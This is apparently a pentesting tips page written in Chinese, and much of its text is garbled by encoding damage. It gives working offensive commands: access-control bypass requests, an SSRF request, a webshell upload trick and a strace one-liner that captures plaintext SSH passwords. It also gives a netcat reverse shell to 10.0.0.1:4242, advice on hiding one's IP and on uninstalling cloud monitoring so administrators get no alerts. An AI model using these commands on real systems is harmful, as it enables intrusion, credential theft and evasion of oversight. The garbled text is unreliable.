# Pentest101
æ¯å‘¨(ä¹Ÿè®¸ä¸)åˆ†äº«ä¸€äº›å…³äºæ¸—é€æµ‹è¯•çš„çŸ¥è¯†ç‚¹

---

æœ‰æ—¶å€™æˆ‘ä»¬æ‹¿äº†ä¸€å° docker æœºå™¨ï¼Œå‘ç°æ²¡æœ‰ ifconfig å‘½ä»¤ä¹Ÿæ²¡æœ‰ ip å‘½ä»¤ï¼Œä¸æ¸…æ¥šæ€ä¹ˆçœ‹ IPï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡æŸ¥çœ‹ proc æ–‡ä»¶çš„æ–¹å¼æ¥æŸ¥çœ‹
```bash
cat /proc/net/fib_trie
cat /etc/sysconfig/network
```

---

æ¸—é€æ—¶é‡åˆ°æŸäº›ä¸Šä¼ ç‚¹æœªä½œè¿‡æ»¤ï¼Œä½†è´Ÿè½½å‡è¡¡åšäº†è¿‡æ»¤åç¼€åçš„æƒ…å†µï¼Œå¯ä»¥ä¸Šä¼  webshell å‘½åä¸º index.phpï¼Œç„¶åè®¿é—® xxx.com/xxx/upload, å°è¯• bypass åä»£çš„ç­–ç•¥

---

å½“æ¸—é€æ—¶é‡åˆ°äº† 403 æˆ–è€… 302ã€401 çš„æ‹’ç»è®¿é—®ï¼Œä¸è¦æ€•ï¼Œå¤š FUZZ å‡ æ¬¡
- ä» HTTP Header å±‚é¢ bypass
    ```bash
    GET /admin HTTP/1.1
    Host: web.com   # ===> 403

    GET /anything HTTP/1.1
    Host: web.com
    X-Original-URL: /admin  # ===> 200

    GET /anything HTTP/1.1
    Host: web.com
    Referer: https://web.com/admin  # ===> 200

    GET https://qq.com HTTP/1.1
    Host: web.com   # ===> SSRF
    ```

- ä» URL å‚æ•°å±‚é¢ bypass
    ```bash
    /admin/panel    # ===> 403
    /admin/monitor  # ===> 200

    /admin/monitor/;panel   # ===> 302
    ```
    ```bash
    web.com/admin   # ===> 403

    web.com/ADMIN       # ===> 200
    web.com/admin/      # ===> 200
    web.com/admin/.     # ===> 200
    web.com//admin//    # ===> 200
    web.com/./admin/./  # ===> 200
    web.com/./admin/..  # ===> 200
    web.com/%2f/admin/  # ===> 200
    web.com/admin.json  # ===> 200(ruby)

    web.com/%2e/admin   # ===> 200
    web.com/%252e/admin # ===> 200
    web.com/%ef%bc%8fadmin  # ===> 200

    web.com/admin       # ===> 302
    web.com/admin..;/   # ===> 200
    ```

- ä»åè®®å±‚é¢ bypass
    ```bash
    http://web.com/admin    # ===> 403
    https://web.com/admin   # ===> 200
    ```

---

å½“æˆ‘ä»¬æ‹¿ä¸‹ windows æœºå™¨æ—¶å¯ä»¥é€šè¿‡æŠ“å†…å­˜ä¸­çš„å¯†ç è¿›è¡Œæ¨ªå‘ï¼Œä½† linux å´ä¸å¯èƒ½æŠ“åˆ°å†…å­˜ä¸­çš„å¯†ç ï¼Œä½†æ˜¯ Debian ç³»åˆ—ä¸‹çš„ linux ç³»ç»Ÿå¯ä»¥é€šè¿‡ç›‘å¬ sshd è¿›ç¨‹çš„æ•°æ®æŠ“å–å‡ºæ˜æ–‡å¯†ç ï¼Œæ¯”å¦‚ä½ æ‹¿ä¸‹äº†ä¸€å°ç®¡ç†å‘˜æœºå™¨ï¼Œä¸Šé¢ç”± xshellï¼Œä½ å¯ä»¥æ‰‹åŠ¨å¼€ä¸€ä¸ªç›‘å¬ï¼Œåœ¨å¼€ä¸€ä¸ªç™»å½•ï¼Œç›‘å¬çš„çª—å£ä¸Šå°±æŠ“å‡ºå¯†ç äº†
```bash
strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --line-buffered -P 'write\(\d, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
```

---

æ¸—é€æ—¶å°½é‡ä¸è¦æš´éœ²è‡ªå·±çš„ IP åœ°å€ï¼ŒæŒ‚ä»£ç†æ˜¯å¿…é¡»çš„
- linux ä¸‹è¦æŸ¥çœ‹è‡ªå·±ç»ˆç«¯æ˜¯å¦èµ°ä»£ç†å¯ä»¥ curl https://ifconfig.me/ çœ‹ä¸‹è¿”å›çš„ IP åœ°å€
- windows å°±ç›´æ¥è®¿é—® https://ifconfig.me/ å³å¯

---

linux ä¸‹ä»£ç†ä¸ç”¨å¤šè¯´, proxychains-ngï¼Œwindows ä¸‹æ¨èç”¨ Proxifier

---

MSF å’Œ CS ä¸­ Stage ä¸ Stageless çš„åŒºåˆ«
- Stage ï¼š å…ˆä¼ ä¸€ä¸ª shellcodeï¼Œç„¶åå›è¿ç«¯å£ï¼ŒåŠ è½½æ¶æ„ metsrvï¼Œç„¶åå†è¯·æ±‚ stdapi äº privï¼Œè¿›è¡Œä¸Šçº¿
- Stageless ï¼š å°† shellcodeã€metsrvã€stdapiã€priv æ‰“åŒ…ï¼Œä¸€æ¬¡æ€§ä¼ å®Œ
- å¦‚æœæƒ³è®© msf ç›´æ¥å›å¼¹åˆ° NCï¼Œé‚£ä¹ˆå¿…é¡»è¦ç”¨ stageless

---

åˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯ä¸æ˜¯è™šæ‹Ÿæœºã€å®¹å™¨
- windows
    - cmd : systeminfo
    - Powershell : get-wmiobject win32_computersystem | fl model
- linux
    ```bash
    lshw -class system | grep -i VM & grep -i virtual
    dmesg | grep -i VM & grep -i virtual
    dmidecode -s system-product-name
    ls /tmp
    systemd-detect-virt
    virt-what
    ls -alh /.dockerenv
    cat /proc/1/cgroup
    ```

---

msf æ¡†æ¶å…¶å®æœ‰è®¸å¤š UI ç•Œé¢çš„å·¥å…·, å¯ä»¥å¸®åŠ©ä¸ä¹ æƒ¯å‘½ä»¤è¡Œçš„æ¸—é€æµ‹è¯•äººå‘˜è¿›è¡Œæ¸—é€ï¼Œæˆ‘ä¸¾å‡ ä¸ªä¾‹å­
- https://github.com/FunnyWolf/Viper
- https://github.com/WayzDev/Kage

---

åœ¨è¿›è¡Œäº‘ä¸»æœºåæ¸—é€æ—¶ï¼Œå¦‚æœè§¦å‘æ•æ„Ÿæ“ä½œï¼Œä¼šæœ‰çŸ­ä¿¡æé†’åˆ°ç®¡ç†å‘˜æ‰‹æœºä¸Šï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥é…Œæƒ…è€ƒè™‘å¸è½½äº‘ä¸»æœºçš„ç›‘æ§ (æœ‰æ—¶ä½ ç”¨äº‘ä¸»æœºè£… SSR ä¼šæ— æ³•è¿æ¥ä¹Ÿæ˜¯è¿™ä¸ªåŸå› )

---

æœ€è¿‘åœ¨ linux æ­å»º vpn æœåŠ¡çš„æ—¶å€™é‡åˆ°æ—¶é—´å’Œæ—¶åŒºä¸åŒæ­¥çš„æƒ…å†µï¼Œåˆ†äº«ä¸‹è§£å†³æ–¹æ¡ˆ
- æŸ¥çœ‹å½“å‰æ—¶åŒºï¼štimedatectl
- ä¿®æ”¹å½“å‰æ—¶åŒºï¼š
- timedatectl set-timezone Asia/Shanghai
- æˆ–
- cp  /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime

---

rlwrap å·¥å…·ï¼Œå¯ä»¥å®Œç¾è§£å†³å„ç±» shell ä¸­æ— æ³•ä¸Šä¸‹å·¦å³çš„é—®é¢˜

ä¾‹å¦‚ ï¼Œå›å¼¹äº† shellï¼Œæ‰‹è´±æŒ‰äº†ä¸Šï¼Œè¿™ç§æƒ…å†µ(æˆ‘æƒ³ä½ ä¸€å®šé‡åˆ°è¿‡ğŸ¤£ğŸ¤£ğŸ¤£ğŸ¤£)
- å®‰è£…ï¼šapt install rlwrap
- ä½¿ç”¨ï¼š rlwrap [Command]

---

cAdvisor æ˜¯ Google å‡ºå“çš„ç”¨äºç›‘æ§ Docker å®¹å™¨çš„æœåŠ¡ï¼Œæ¸—é€æ—¶é‡åˆ°è¿™ä¸ªæœåŠ¡åŸºæœ¬ä¸Šæ˜¯å­˜åœ¨å®¹å™¨ç¯å¢ƒ

---

æ–°ç‰ˆ kali 2020 ç‰ˆåä½¿ç”¨ root è´¦å·é»˜è®¤ä¸ç»™å¯†ç ï¼Œå¦‚æœä½ æƒ³,å¯ä»¥ç›´æ¥è¿›è¡Œä¿®æ”¹ : sudo passwd root

---

nc å…·æœ‰å¤šä¸ªç‰ˆæœ¬, æ¯”å¦‚: traditionalã€openbsdã€ncat
- traditional æœ€è€çš„ç‰ˆæœ¬,æ”¯æŒæœ€åŸºæœ¬çš„åŠŸèƒ½
- openbsd å®‰å…¨ç‰ˆæœ¬,å›å¼¹è¦ç”¨ä¸€å¤§æ®µå‘½ä»¤
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
- ncat æ–°ç‰ˆæœ¬, é‡æ„äº†æ—§ç‰ˆçš„ä»£ç å¹¶æ”¯æŒäº†è®¸å¤šæ–°åŠŸèƒ½, debian ç³»åˆ—å‘è¡Œç‰ˆä¸‹é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…é…ç½®
    apt install -y ncat
    update-alternatives --set nc /usr/bin/ncat
